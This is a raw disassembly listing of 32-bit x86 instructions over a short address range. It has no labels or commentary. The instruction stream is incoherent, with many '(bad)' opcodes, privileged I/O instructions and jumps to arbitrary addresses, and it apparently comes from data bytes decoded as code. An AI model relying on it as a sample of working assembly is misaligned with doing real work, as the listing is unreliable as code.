  41e7d7:	sbb    DWORD PTR cs:[ecx-0x50],esp
  41e7db:	je     0x41e7d6
  41e7dd:	in     eax,dx
  41e7de:	jnp    0x41e7db
  41e7e0:	addr16 pushf 
  41e7e2:	sub    dh,ah
  41e7e4:	nop
  41e7e5:	inc    ebp
  41e7e6:	lods   al,BYTE PTR ds:[esi]
  41e7e7:	ins    BYTE PTR es:[edi],dx
  41e7e8:	or     eax,0x7dab954
  41e7ed:	cmp    al,0xb4
  41e7ef:	idiv   BYTE PTR [edx+eiz*2]
  41e7f2:	add    eax,0x581ef41b
  41e7f7:	jp     0x41e77d
  41e7f9:	imul   DWORD PTR [ebp-0x2223535f]
  41e7ff:	inc    eax
  41e800:	sbb    cl,BYTE PTR [esi+esi*4-0x1f21beab]
  41e807:	dec    ecx
  41e808:	cmp    ebx,edx
  41e80a:	xchg   edx,eax
  41e80b:	aas    
  41e80c:	into   
  41e80d:	sbb    ah,BYTE PTR [edi]
  41e80f:	jbe    0x41e878
  41e811:	data16 and al,0x2
  41e814:	(bad)  
  41e815:	pop    eax
  41e816:	es push ds
  41e818:	lock ins BYTE PTR es:[edi],dx
  41e81a:	jbe    0x41e7fe
  41e81c:	adc    BYTE PTR [edi-0x76],bh
  41e81f:	pop    ecx
  41e820:	je     0x41e86d
  41e822:	test   edi,ebp
  41e824:	aam    0x1
  41e826:	pop    ds
  41e827:	jb     0x41e800
  41e829:	sub    eax,0xd2ed8da2
  41e82e:	iret   
  41e82f:	dec    ecx
  41e830:	pop    esi
  41e831:	adc    al,BYTE PTR [ecx+0x1a2cb26]
  41e837:	sub    DWORD PTR [esi-0x73d1dd16],edi
  41e83d:	pushf  
  41e83e:	jg     0x41e7d1
  41e840:	dec    eax
  41e841:	in     eax,0xf8
  41e843:	xor    eax,0xe3c42b99
  41e848:	inc    eax
  41e849:	dec    ebx
  41e84a:	mov    dh,0x95
  41e84c:	mov    esp,0xe301f9bf
  41e851:	enter  0x5d98,0xc0
  41e855:	push   edi
  41e856:	jecxz  0x41e8ae
  41e858:	mov    cs,esi
  41e85a:	adc    eax,0x28da182d
  41e85f:	xchg   ecx,eax
  41e860:	imul   ebp,DWORD PTR [edi],0xa76a7b28
  41e866:	stc    
  41e867:	scas   eax,DWORD PTR es:[edi]
  41e868:	jns    0x41e84d
  41e86a:	test   eax,0xa637c71a
  41e86f:	mov    eax,ds:0xe1dece47
  41e874:	and    esp,edx
  41e876:	test   al,0x9
  41e878:	adc    al,0x5e
  41e87a:	add    BYTE PTR [eax+0x36f829b5],ah
  41e880:	pop    esp
  41e881:	scas   al,BYTE PTR es:[edi]
  41e882:	pusha  
  41e883:	enter  0xfe3b,0xc0
  41e887:	xchg   DWORD PTR [ebx],ebp
  41e889:	add    DWORD PTR [edi-0x6c],0x1f979c59
  41e890:	xchg   ebx,eax
  41e891:	or     al,0x6a
  41e893:	pop    edi
  41e894:	pop    eax
  41e895:	popf   
  41e896:	call   0x56a5:0xa97c6311
  41e89d:	xor    al,0x50
  41e89f:	mov    ds:0xd7e1ea22,al
  41e8a4:	mov    BYTE PTR ds:0x29024bf9,dl
  41e8aa:	or     bh,bl
  41e8ac:	mov    bh,0xa5
  41e8ae:	aad    0xde
  41e8b0:	mov    eax,0x3e5d9f72
  41e8b5:	jne    0x41e859
  41e8b7:	xchg   edi,eax
  41e8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8b9:	js     0x41e8dc
  41e8bb:	cmp    DWORD PTR [edx],edi
  41e8bd:	test   al,0x98
  41e8bf:	sbb    al,0x6a
  41e8c1:	pop    edx
  41e8c2:	retf   0x8390
  41e8c5:	das    
  41e8c6:	outs   dx,DWORD PTR ds:[esi]
  41e8c7:	xchg   esi,eax
  41e8c8:	add    eax,0x7d3ec07
  41e8cd:	sahf   
  41e8ce:	int    0xac
  41e8d0:	sahf   
  41e8d1:	mov    DWORD PTR [ebx-0x2278d582],esp
  41e8d7:	cld    
  41e8d8:	inc    ecx
  41e8d9:	fs in  al,0xd2
  41e8dc:	ss int 0x6d
  41e8df:	ret    
  41e8e0:	push   ecx
  41e8e1:	retf   
  41e8e2:	sub    ebp,DWORD PTR [edi-0x1e]
  41e8e5:	jbe    0x41e91a
  41e8e7:	mov    ch,0xd8
  41e8e9:	sbb    ah,BYTE PTR [edi+0x4d2d41e0]
  41e8ef:	inc    ebp
  41e8f0:	inc    DWORD PTR [esi-0x10]
  41e8f3:	or     eax,0x1fbb9f0c
  41e8f8:	outs   dx,DWORD PTR ds:[esi]
  41e8f9:	js     0x41e927
  41e8fb:	call   0x66535e0e
  41e900:	push   ss
  41e901:	int3   
  41e902:	nop
  41e903:	adc    eax,0x30dcc78f
  41e908:	xchg   esi,eax
  41e909:	addr16 mov ds:0x9aa4,eax
  41e90d:	sbb    BYTE PTR [edi],ah
  41e90f:	outs   dx,DWORD PTR ds:[esi]
  41e910:	bound  edx,QWORD PTR [esi+ebx*4]
  41e913:	push   edi
  41e914:	or     dh,BYTE PTR [ebx+0x243e6ba5]
  41e91a:	cdq    
  41e91b:	inc    edx
  41e91c:	(bad)  
  41e91d:	scas   al,BYTE PTR es:[edi]
  41e91e:	icebp  
  41e91f:	sbb    eax,0xb9878992
  41e924:	jecxz  0x41e929
  41e926:	mov    eax,0x12ea6f1f
  41e92b:	or     eax,0xd845e03e
  41e930:	scas   al,BYTE PTR es:[edi]
  41e931:	std    
  41e932:	cmp    eax,0xaddbe679
  41e937:	jne    0x41e99e
  41e939:	mov    edx,0xf314b2d9
  41e93e:	pop    es
  41e93f:	mov    ds:0x9bb1549d,eax
  41e944:	and    BYTE PTR [eax],cl
  41e946:	popf   
  41e947:	dec    edx
  41e948:	(bad)
  41e94b:	out    dx,eax
  41e94c:	pop    ds
  41e94d:	xor    dl,bh
  41e94f:	clc    
  41e950:	add    ebx,edx
  41e952:	call   0x583a41fa
  41e957:	ror    BYTE PTR ds:0x5c53b7e9,1
  41e95d:	or     DWORD PTR [edx],0x99376546
  41e963:	stos   BYTE PTR es:[edi],al
  41e964:	and    DWORD PTR [edx+0x2bcc31dd],ecx
  41e96a:	or     eax,0xca3edf9
  41e96f:	out    dx,al
  41e970:	mov    DWORD PTR [eax],0xc756628e
  41e976:	std    
  41e977:	jnp    0x41e939
  41e979:	fnstsw WORD PTR [esi]
  41e97b:	mov    cl,0xe1
  41e97d:	clc    
  41e97e:	and    eax,0x8d67816f
  41e983:	icebp  
  41e984:	not    ch
  41e986:	loop   0x41e9bf
  41e988:	inc    ecx
  41e989:	mov    cs,WORD PTR [ecx-0x2629dfe]
  41e98f:	add    DWORD PTR fs:[edi-0x370dd12c],0x8ca1c88b
  41e99a:	and    DWORD PTR [edx+esi*2],ebp
  41e99d:	adc    eax,0x8b979283
  41e9a2:	fisub  DWORD PTR [ebx]
  41e9a4:	lods   al,BYTE PTR ds:[esi]
  41e9a5:	(bad)  
  41e9a6:	aad    0xb8
  41e9a8:	push   0x5ef44729
  41e9ad:	jge    0x41ea0d
  41e9af:	pop    edi
  41e9b0:	inc    esi
  41e9b2:	jns    0x41e9c3
  41e9b4:	pushf  
  41e9b5:	or     al,0x8d
  41e9b7:	retf   
  41e9b8:	jmp    0xf9b387c2
  41e9bd:	inc    DWORD PTR [eax+0x3c]
  41e9c0:	mov    cl,0xc7
  41e9c2:	aam    0x7a
  41e9c4:	mov    edx,DWORD PTR [eax-0x5f31e912]
  41e9ca:	jnp    0x41e9d8
  41e9cc:	cmp    eax,DWORD PTR [edi-0x9]
  41e9cf:	lahf   
  41e9d0:	pop    edx
  41e9d1:	xchg   ebp,eax
  41e9d2:	jp     0x41ea51
  41e9d4:	dec    edi
  41e9d5:	retf   0xcb74
  41e9d8:	and    eax,0xa66d8819
  41e9dd:	aas    
  41e9de:	xchg   esi,eax
  41e9df:	xor    ecx,DWORD PTR [eax+ebx*1-0x58d819c7]
  41e9e6:	sbb    al,0xf2
  41e9e8:	mov    BYTE PTR [edx],0xfd
  41e9eb:	jle    0x41e9fa
  41e9ed:	mov    ch,0xc1
  41e9ef:	(bad)  
  41e9f0:	sbb    al,0x8a
  41e9f2:	inc    esp
  41e9f3:	pop    esi
  41e9f4:	(bad)  
  41e9f5:	mov    esi,ecx
  41e9f7:	sti    
  41e9f8:	popf   
  41e9f9:	mov    ebp,DWORD PTR [esi-0x3d]
  41e9fc:	lahf   
  41e9fd:	lea    esi,[esi-0x15]
  41ea00:	xchg   edi,eax
  41ea01:	stos   DWORD PTR es:[edi],eax
  41ea02:	dec    esi
  41ea03:	aam    0xbd
  41ea05:	popa   
  41ea06:	sub    al,0xfa
  41ea08:	cli    
  41ea09:	mov    eax,0x32881f6a
  41ea0e:	dec    edi
  41ea0f:	jl     0x41e995
  41ea11:	sub    ah,dh
  41ea13:	scas   al,BYTE PTR es:[edi]
  41ea14:	imul   esi,edi,0xf9b63033
  41ea1a:	aaa    
  41ea1b:	and    al,0x3e
  41ea1d:	pop    edx
  41ea1e:	bound  ecx,QWORD PTR [esi+0x57]
  41ea21:	into   
  41ea22:	or     edi,DWORD PTR [ebx]
  41ea24:	fstp   DWORD PTR [ebx]
  41ea26:	into   
  41ea27:	push   cs
  41ea28:	xor    ebp,DWORD PTR [ecx-0x5a25947c]
  41ea2e:	ins    DWORD PTR es:[edi],dx
  41ea2f:	not    BYTE PTR [eax-0x20bf674a]
  41ea35:	push   edx
  41ea36:	xchg   BYTE PTR [eax-0x2],dh
  41ea39:	popa   
  41ea3a:	jle    0x41ea3d
  41ea3c:	aaa    
  41ea3d:	(bad)  
  41ea3e:	lods   eax,DWORD PTR ds:[esi]
  41ea3f:	popf   
  41ea40:	(bad)  
  41ea41:	pop    edi
  41ea42:	retf   
  41ea43:	shl    BYTE PTR [esi+edx*1],0xbd
  41ea47:	(bad)  
  41ea48:	loopne 0x41ea52
  41ea4a:	mov    ch,0x6e
  41ea4c:	div    DWORD PTR [esp+eiz*4-0x31]
  41ea50:	push   0x76a08e8b
  41ea55:	outs   dx,BYTE PTR ds:[esi]
  41ea56:	mov    dl,BYTE PTR [eax-0x2c]
  41ea59:	mov    ebx,0xa2db5ee
  41ea5e:	push   cs
  41ea5f:	push   0x1b0f3d33
  41ea64:	jae    0x41ea4a
  41ea66:	dec    ecx
  41ea67:	mov    ebp,0xce32ca77
  41ea6c:	dec    eax
  41ea6d:	pop    ebp
  41ea6e:	push   es
  41ea6f:	enter  0x93c7,0xbf
  41ea73:	jmp    0x41eaec
  41ea75:	sbb    BYTE PTR [edx],al
  41ea77:	and    al,0x79
  41ea79:	shl    DWORD PTR [eax+ebx*8-0x16ee9450],cl
  41ea80:	imul   eax,DWORD PTR [eax+0x5a9a421f],0x36
  41ea87:	or     edi,0xcebdbeac
  41ea8d:	loope  0x41ea9a
  41ea8f:	pop    ebx
  41ea90:	cld    
  41ea91:	pop    ecx
  41ea92:	mov    ebp,DWORD PTR [edi-0x391dff5d]
  41ea98:	into   
  41ea99:	or     al,0xe5
  41ea9b:	cwde   
  41ea9c:	sbb    al,0x20
  41ea9e:	inc    ebp
  41ea9f:	js     0x41ea4c
  41eaa1:	mov    ecx,0x2769c41d
  41eaa6:	cmc    
  41eaa7:	int3   
  41eaa8:	fwait
  41eaa9:	push   0x12
  41eaab:	push   ebx
  41eaac:	inc    edi
  41eaad:	adc    esp,DWORD PTR [ebp+0x2f]
  41eab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eab1:	imul   esp,DWORD PTR [ecx],0xffffff81
  41eab4:	jmp    0x8830a8a3
  41eab9:	push   ebp
  41eaba:	repnz out dx,al
  41eabc:	and    esi,DWORD PTR [eax+0x4b]
  41eabf:	ins    BYTE PTR es:[edi],dx
  41eac0:	ss ins DWORD PTR es:[edi],dx
  41eac2:	jp     0x41eaf8
  41eac4:	jns    0x41eaec
  41eac6:	jbe    0x41eae3
  41eac8:	dec    ecx
  41eac9:	jp     0x41eb16
  41eacb:	(bad)  
  41eacc:	fcom   QWORD PTR [ebp+ebp*2-0x4e]
  41ead0:	sar    al,0xb7
  41ead3:	lds    ecx,FWORD PTR ds:0xf53e0a22
  41ead9:	cmc    
  41eada:	pop    edi
  41eadb:	std    
  41eadc:	and    al,BYTE PTR [edx+0x19fed350]
  41eae2:	jns    0x41eb13
  41eae4:	out    0x4,al
  41eae6:	adc    DWORD PTR [edi],ecx
  41eae8:	jle    0x41eb5a
  41eaea:	or     edi,ebp
  41eaec:	jl     0x41eb32
  41eaee:	out    0x81,al
  41eaf0:	mov    ah,0x2f
  41eaf2:	xchg   ebx,eax
  41eaf3:	call   0x9d43:0xd3490022
  41eafa:	mov    al,0xdc
  41eafc:	mov    al,ds:0x1ecd89cb
  41eb01:	dec    ebx
  41eb02:	loopne 0x41ea8d
  41eb04:	xlat   BYTE PTR ds:[ebx]
  41eb05:	ins    DWORD PTR es:[edi],dx
  41eb06:	and    cl,bl
  41eb08:	outs   dx,BYTE PTR ds:[esi]
  41eb09:	sbb    al,BYTE PTR [eax]
  41eb0b:	popf   
  41eb0c:	out    dx,al
  41eb0d:	jmp    0x41eb19
  41eb0f:	lds    ebp,FWORD PTR [edx-0x5fe70c38]
  41eb15:	adc    esi,DWORD PTR [eax-0x64]
  41eb18:	hlt    
  41eb19:	fmul   st(4),st
  41eb1b:	pop    edi
  41eb1c:	ror    DWORD PTR [ebp+0x20cd7091],cl
  41eb22:	push   ss
  41eb23:	adc    DWORD PTR [edi+0x39c72b72],esp
  41eb29:	or     esi,DWORD PTR [edi+0x33]
  41eb2c:	mov    cl,0xc
  41eb2e:	sub    ebx,0x7d
  41eb31:	stc    
  41eb32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb33:	rcr    BYTE PTR [ebx],1
  41eb35:	fisttp QWORD PTR ds:0xb754f61a
  41eb3b:	xor    al,0xca
  41eb3d:	test   BYTE PTR [eax+0x6020993],cl
  41eb43:	repnz aaa 
  41eb45:	or     BYTE PTR [edi-0x5eed055],al
  41eb4b:	aad    0xa2
  41eb4d:	or     BYTE PTR [edx+0x33942d82],0x34
  41eb54:	imul   ebx,DWORD PTR [ebx+esi*2+0x13d1069f],0xcc197578
  41eb5f:	out    0x9a,eax
  41eb61:	push   edx
  41eb62:	enter  0xb99e,0x6a
  41eb66:	out    dx,al
  41eb67:	shl    BYTE PTR [eax-0x59e56a32],1
  41eb6d:	cmp    edx,edx
  41eb6f:	arpl   di,cx
  41eb71:	fadd   QWORD PTR ds:0xb4d20e2
  41eb77:	lods   al,BYTE PTR ds:[esi]
  41eb78:	ds pop esp
  41eb7a:	sti    
  41eb7b:	fnsave [esi]
  41eb7d:	test   al,0x64
  41eb80:	icebp  
  41eb81:	cmp    ecx,DWORD PTR fs:[ecx-0x528e0900]
  41eb88:	mov    ds:0x8fef36d,eax
  41eb8d:	adc    bh,bl
  41eb8f:	sub    DWORD PTR [ecx-0x4e],edi
  41eb92:	retf   0xd8e5
  41eb95:	(bad)  
  41eb96:	fiadd  WORD PTR [edx-0x54]
  41eb99:	inc    ecx
  41eb9a:	xor    al,dh
  41eb9c:	test   DWORD PTR [esi],0xf37b383a
  41eba2:	fwait
  41eba3:	dec    eax
  41eba5:	jae    0x41ebae
  41eba7:	in     al,dx
  41eba8:	fistp  WORD PTR [ebp+ebp*2-0x70]
  41ebac:	jle    0x41ec14
  41ebae:	les    ebx,FWORD PTR [ebx+0x45852251]
  41ebb4:	xchg   ebp,eax
  41ebb5:	cmp    eax,0x83b75989
  41ebba:	inc    edi
  41ebbb:	push   edi
  41ebbc:	push   cs
  41ebbd:	popa   
  41ebbe:	push   esp
  41ebbf:	inc    esp
  41ebc0:	add    DWORD PTR [edi+ecx*8-0x1e],ecx
  41ebc4:	jbe    0x41ec21
  41ebc6:	and    DWORD PTR [edx+eax*1],esi
  41ebc9:	addr16 xchg ecx,eax
  41ebcb:	pop    ebx
  41ebcc:	add    esi,edx
  41ebce:	cmc    
  41ebcf:	push   eax
  41ebd0:	xor    al,0x8f
  41ebd2:	fimul  WORD PTR [eax+0x1fa78f14]
  41ebd8:	sar    DWORD PTR [ebp-0x7ead7fb],1
  41ebde:	repnz add DWORD PTR [eax],edi
  41ebe1:	or     DWORD PTR [ebx],eax
  41ebe3:	inc    esi
  41ebe4:	add    DWORD PTR [edx-0x4f19a5f6],eax
  41ebea:	xchg   edi,eax
  41ebeb:	sub    eax,0x41c1b277
  41ebf0:	sub    eax,edx
  41ebf2:	pusha  
  41ebf3:	(bad)  
  41ebf4:	icebp  
  41ebf5:	cmp    BYTE PTR [ebp+0x7b],cl
  41ebf8:	fist   WORD PTR [eax-0x679d2cf3]
  41ebfe:	or     BYTE PTR [esi-0x7adb4b47],bh
  41ec04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec05:	enter  0xf49a,0x10
  41ec09:	ins    DWORD PTR es:[edi],dx
  41ec0a:	(bad)  
  41ec0b:	rcl    BYTE PTR [esp+eiz*4+0x4],1
  41ec0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec10:	jmp    0x28deef90
  41ec15:	mov    eax,0x7b12743f
  41ec1a:	sahf   
  41ec1b:	ret    
  41ec1c:	stc    
  41ec1d:	daa    
  41ec1e:	lods   al,BYTE PTR ds:[esi]
  41ec1f:	jle    0x41ec20
  41ec21:	sbb    ch,ch
  41ec23:	or     dh,cl
  41ec25:	sti    
  41ec26:	mov    dl,0xc8
  41ec28:	push   ebx
  41ec29:	ins    BYTE PTR es:[edi],dx
  41ec2a:	int3   
  41ec2b:	push   DWORD PTR [ebp+0x6015cd86]
  41ec31:	es stos BYTE PTR es:[edi],al
  41ec33:	mov    cl,0x40
  41ec35:	mov    eax,ds:0x6d76c7ec
  41ec3a:	dec    edi
  41ec3b:	fcom   QWORD PTR [eax]
  41ec3d:	(bad)  
  41ec3e:	add    eax,0xf0c1b7b7
  41ec43:	ss inc ebp
  41ec45:	xor    eax,0x3a386c8c
  41ec4a:	and    esi,0x30897c93
  41ec50:	mov    ecx,0xa9a5532e
  41ec55:	add    bl,al
  41ec57:	push   ss
  41ec58:	add    dl,BYTE PTR [esi+0x4db4c060]
  41ec5e:	into   
  41ec5f:	cmp    BYTE PTR [edx+0x77],dl
  41ec62:	and    eax,0xc11afb1a
  41ec67:	sub    DWORD PTR [ecx+0x5a],eax
  41ec6a:	xor    ch,BYTE PTR [edx-0x4b311f76]
  41ec70:	and    eax,0x7cb9a9e0
  41ec75:	and    BYTE PTR [edi],ah
  41ec77:	adc    edi,DWORD PTR [esi-0x95b02de]
  41ec7d:	fwait
  41ec7e:	ret    
  41ec7f:	and    dh,cl
  41ec81:	adc    BYTE PTR [ebx-0x3e],cl
  41ec84:	ja     0x41ec95
  41ec86:	leave  
  41ec87:	cld    
  41ec88:	xor    al,0xff
  41ec8a:	or     ebp,DWORD PTR [ebx]
  41ec8c:	inc    ebp
  41ec8d:	jle    0x41ecad
  41ec8f:	mov    ch,0xbc
  41ec91:	scas   al,BYTE PTR es:[edi]
  41ec92:	(bad)  [edx+0x72b6184b]
  41ec98:	bound  edx,QWORD PTR [esi-0x35e085cb]
  41ec9e:	push   ebx
  41ec9f:	hlt    
  41eca0:	test   BYTE PTR [edi+0x7aa17587],ch
  41eca6:	pop    esi
  41eca7:	or     DWORD PTR [edx+0x44c30d8b],0xffffffab
  41ecae:	cdq    
  41ecaf:	adc    eax,0x9382f8c2
  41ecb4:	mov    ds:0x164df775,eax
  41ecb9:	pop    ebx
  41ecba:	xchg   ebx,eax
  41ecbb:	out    dx,al
  41ecbc:	ror    BYTE PTR ds:0xd570a4ef,cl
  41ecc2:	mov    bl,0x1c
  41ecc4:	daa    
  41ecc5:	ins    DWORD PTR es:[edi],dx
  41ecc6:	sbb    eax,0x3214eea8
  41eccb:	and    ah,BYTE PTR [ebx]
  41eccd:	hlt    
  41ecce:	outs   dx,BYTE PTR ds:[esi]
  41eccf:	jbe    0x41eca3
  41ecd1:	mov    al,ds:0x53b19f95
  41ecd6:	xchg   ecx,eax
  41ecd7:	retf   
  41ecd8:	popa   
  41ecd9:	shr    ecx,cl
  41ecdb:	pop    ds
  41ecdc:	adc    BYTE PTR [ebx],ch
  41ecde:	sbb    al,0x26
  41ece0:	pop    edx
  41ece1:	push   esp
  41ece2:	int3   
  41ece3:	mov    edx,0x7c159ab2
  41ece8:	mov    bh,0x29
  41ecea:	xor    bh,bl
  41ecec:	jp     0x41ecf8
  41ecee:	int3   
  41ecef:	in     al,dx
  41ecf0:	enter  0x88fe,0x0
  41ecf4:	jbe    0x41eca6
  41ecf6:	or     DWORD PTR [edi+eax*2+0x19bc0ecf],esi
  41ecfd:	xor    eax,0x176d7265
  41ed02:	and    al,0xfb
  41ed04:	nop
  41ed05:	jmp    0x1282:0x2d12d143
  41ed0c:	jge    0x41ed32
  41ed0e:	dec    esi
  41ed0f:	push   es
  41ed10:	xchg   ebp,eax
  41ed11:	call   0xca9:0xd1213a3d
  41ed18:	sub    al,0x54
  41ed1a:	(bad)  
  41ed1b:	push   esi
  41ed1c:	scas   eax,DWORD PTR es:[edi]
  41ed1d:	xchg   DWORD PTR [esi-0x4c],edi
  41ed20:	mov    ds:0x2f469be1,eax
  41ed25:	icebp  
  41ed26:	or     bh,BYTE PTR [esi+edx*1-0x56]
  41ed2a:	addr16 dec esp
  41ed2c:	mov    dh,0x3f
  41ed2e:	loope  0x41ed4b
  41ed30:	pop    edx
  41ed31:	ror    DWORD PTR [ebx],cl
  41ed33:	test   al,0x6d
  41ed35:	mov    edi,0x79e00f3c
  41ed3a:	stos   DWORD PTR es:[edi],eax
  41ed3b:	or     DWORD PTR [esi+0x63],ebp
  41ed3e:	xchg   ecx,eax
  41ed3f:	fs stos BYTE PTR es:[edi],al
  41ed41:	sub    eax,0x8c3a520a
  41ed46:	lds    ebp,FWORD PTR [esi-0x8825f03]
  41ed4c:	ins    BYTE PTR es:[edi],dx
  41ed4d:	pop    es
  41ed4e:	clc    
  41ed4f:	fwait
  41ed50:	call   0xd7ca6cae
  41ed55:	sub    BYTE PTR [eax],bh
  41ed57:	mov    al,0xf8
  41ed59:	xchg   DWORD PTR ds:0x12a6d071,esi
  41ed5f:	add    eax,0x66b128fc
  41ed64:	dec    edi
  41ed65:	push   0x7739af31
  41ed6a:	xchg   ebp,eax
  41ed6b:	clc    
  41ed6c:	ds sbb eax,0xdc9e91ba
  41ed72:	xor    DWORD PTR [esi-0x720a0061],edx
  41ed78:	pop    esp
  41ed79:	push   ecx
  41ed7b:	pop    ss
  41ed7c:	mov    edx,0xb4533ddf
  41ed81:	or     al,0x44
  41ed83:	mov    esi,0xee7390c0
  41ed88:	mov    al,ds:0xf17c5b5a
  41ed8d:	xchg   ecx,eax
  41ed8e:	icebp  
  41ed8f:	test   eax,0xaa89b2da
  41ed94:	fst    DWORD PTR [edx+0x5bbb017d]
  41ed9a:	inc    esi
  41ed9b:	(bad)  
  41ed9d:	cdq    
  41ed9e:	mov    BYTE PTR [ebx+0x60],dh
  41eda1:	xchg   edi,eax
  41eda2:	aam    0x7f
  41eda4:	loop   0x41ed34
  41eda6:	dec    edx
  41eda7:	popf   
  41eda8:	shl    BYTE PTR [esi-0x55],0xc2
  41edac:	jne    0x41ee0f
  41edae:	sbb    DWORD PTR [eax-0x4b],ebx
  41edb1:	or     edi,eax
  41edb3:	stc    
  41edb4:	sbb    BYTE PTR [ebx],0xca
  41edb7:	cs pop es
  41edb9:	add    ecx,edi
  41edbb:	pop    edx
  41edbc:	ffreep st(2)
  41edbe:	mov    ch,0xc5
  41edc0:	call   0xdf69e75c
  41edc5:	inc    edi
  41edc6:	or     eax,DWORD PTR [edi-0x7abe3f9e]
  41edcc:	stos   DWORD PTR es:[edi],eax
  41edcd:	aaa    
  41edce:	iret   
  41edcf:	sbb    ah,BYTE PTR [ebx-0x5f]
  41edd2:	push   esi
  41edd3:	mov    al,ds:0x9223f5c
  41edd8:	icebp  
  41edd9:	bnd jns 0x41edde
  41eddc:	and    dh,BYTE PTR ds:0x17e6650c
  41ede2:	outs   dx,DWORD PTR ds:[esi]
  41ede3:	dec    edi
  41ede4:	data16 jl 0x41ed7d
  41ede7:	popf   
  41ede8:	into   
  41ede9:	mov    bh,0x39
  41edeb:	aad    0x36
  41eded:	into   
  41edee:	test   DWORD PTR [edi+0x18],edx
  41edf1:	dec    esi
  41edf2:	sbb    dh,BYTE PTR [edi-0x48]
  41edf5:	or     al,0x75
  41edf7:	sub    BYTE PTR [esi],bh
  41edf9:	popf   
  41edfa:	into   
  41edfb:	stos   BYTE PTR es:[edi],al
  41edfc:	cli    
  41edfd:	pop    edx
  41edfe:	pop    ebx
  41edff:	push   ebx
  41ee00:	ss mov ah,0xa6
  41ee03:	pusha  
  41ee04:	arpl   WORD PTR [ecx+0x340424c0],bp
  41ee0a:	out    dx,al
  41ee0b:	ds dec eax
  41ee0d:	in     al,dx
  41ee0e:	arpl   WORD PTR ds:0xe6e1c486,di
  41ee14:	push   eax
  41ee15:	out    dx,eax
  41ee16:	mov    ebx,0xf1618db1
  41ee1b:	lea    esp,[edx]
  41ee1d:	out    dx,eax
  41ee1e:	cmp    DWORD PTR [esi],ebp
  41ee20:	xchg   esi,eax
  41ee21:	cmp    eax,0xe3011380
  41ee26:	cmp    esi,ebx
  41ee28:	call   0xa7146c90
  41ee2d:	test   eax,0x26caa0f
  41ee32:	push   eax
  41ee33:	ins    BYTE PTR es:[edi],dx
  41ee34:	mov    cl,0x65
  41ee36:	jmp    0xf9d84662
  41ee3b:	repnz inc ebp
  41ee3d:	popa   
  41ee3e:	mov    dh,0x17
  41ee40:	ins    DWORD PTR es:[edi],dx
  41ee41:	hlt    
  41ee42:	push   es
  41ee43:	pop    ebx
  41ee44:	shr    DWORD PTR [edx+ecx*4],cl
  41ee47:	jno    0x41edd9
  41ee49:	add    al,0xfa
  41ee4b:	call   0x31bcb2c1
  41ee50:	jne    0x41ee26
  41ee52:	outs   dx,BYTE PTR ds:[esi]
  41ee53:	push   ebx
  41ee54:	push   0xdd37cc0e
  41ee59:	mov    al,ds:0x56213be1
  41ee5e:	int    0x93
  41ee60:	mov    BYTE PTR [esi],bl
  41ee62:	mov    WORD PTR [edi],es
  41ee64:	mov    ebx,0x8591f80c
  41ee69:	pop    ebx
  41ee6a:	pusha  
  41ee6b:	call   0xe3314f9
  41ee70:	sub    dh,dl
  41ee72:	and    bh,BYTE PTR [esi+0x62]
  41ee75:	repz rcr eax,1
  41ee78:	(bad)  
  41ee79:	sbb    eax,DWORD PTR [esi-0x48]
  41ee7c:	or     esp,DWORD PTR [ebx-0x61adb422]
  41ee82:	scas   eax,DWORD PTR es:[edi]
  41ee83:	mov    cl,0x65
  41ee85:	gs inc ebp
  41ee87:	enter  0xf46e,0xbe
  41ee8b:	jmp    DWORD PTR [ecx]
  41ee8d:	or     cl,BYTE PTR [ecx-0x60660792]
  41ee93:	or     ebx,DWORD PTR [eax+ecx*2+0x43]
  41ee97:	jne    0x41ee44
  41ee99:	xor    ebx,ebp
  41ee9b:	jecxz  0x41eeee
  41ee9d:	adc    ah,BYTE PTR [edi+0x4b36a03e]
  41eea3:	xchg   esp,eax
  41eea4:	mov    ebp,0x31b40638
  41eea9:	jecxz  0x41eeaa
  41eeab:	jmp    0x41eea4
  41eead:	mov    cl,0xc1
  41eeaf:	xchg   cl,dh
  41eeb1:	(bad)  
  41eeb2:	xchg   edi,eax
  41eeb3:	(bad)  
  41eeb5:	icebp  
  41eeb6:	call   0xa6caca5c
  41eebb:	out    dx,eax
  41eebc:	(bad)  
  41eebd:	and    DWORD PTR [eax-0xd829f69],edx
  41eec3:	nop
  41eec4:	loopne 0x41eed3
  41eec6:	push   cs
  41eec7:	or     BYTE PTR [esi],cl
  41eec9:	inc    esi
  41eeca:	fst    st(2)
  41eecc:	test   al,0xe
  41eece:	jmp    0x1e9b:0x6178f874
  41eed5:	test   eax,0x3bc98e0e
  41eeda:	(bad)  
  41eedb:	mov    eax,0x24d50f65
  41eee0:	mov    dh,0x33
  41eee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eee3:	out    0xbe,al
  41eee5:	daa    
  41eee6:	daa    
  41eee7:	sahf   
  41eee8:	icebp  
  41eee9:	in     al,0xb0
  41eeeb:	add    DWORD PTR [eax+0x23291b47],0xac41f2e8
  41eef5:	outs   dx,BYTE PTR ds:[esi]
  41eef6:	addr16 pop esi
  41eef8:	rcr    DWORD PTR [eax],0x4d
  41eefb:	push   0x36
  41eefd:	jp     0x41eeaf
  41eeff:	ficomp DWORD PTR [ebx+esi*2+0x93665da]
  41ef06:	sub    eax,DWORD PTR [ecx]
  41ef08:	fdiv   QWORD PTR [ebx+eiz*2]
  41ef0b:	cmp    eax,0xf793ac8d
  41ef10:	push   ss
  41ef11:	xlat   BYTE PTR ds:[ebx]
  41ef12:	pop    ss
  41ef13:	fwait
  41ef14:	loope  0x41ef2b
  41ef16:	mov    eax,0x55894a68
  41ef1b:	xlat   BYTE PTR ds:[ebx]
  41ef1c:	inc    ecx
  41ef1d:	mov    BYTE PTR [ecx+0x41],dl
  41ef20:	xor    ecx,ebp
  41ef22:	add    ah,BYTE PTR [edx]
  41ef24:	dec    ebp
  41ef25:	gs fucom st(3)
  41ef28:	and    dh,dh
  41ef2a:	es mov esp,0xf3493a12
  41ef30:	jno    0x41efa6
  41ef32:	cmc    
  41ef33:	mov    WORD PTR [edx],?
  41ef35:	lock leave 
  41ef37:	leave  
  41ef38:	xchg   ecx,eax
  41ef39:	pop    edi
  41ef3a:	adc    ebp,esp
  41ef3c:	call   FWORD PTR [esi]
  41ef3e:	jnp    0x41ef10
  41ef40:	jle    0x41eed4
  41ef42:	mov    edx,DWORD PTR [ebx]
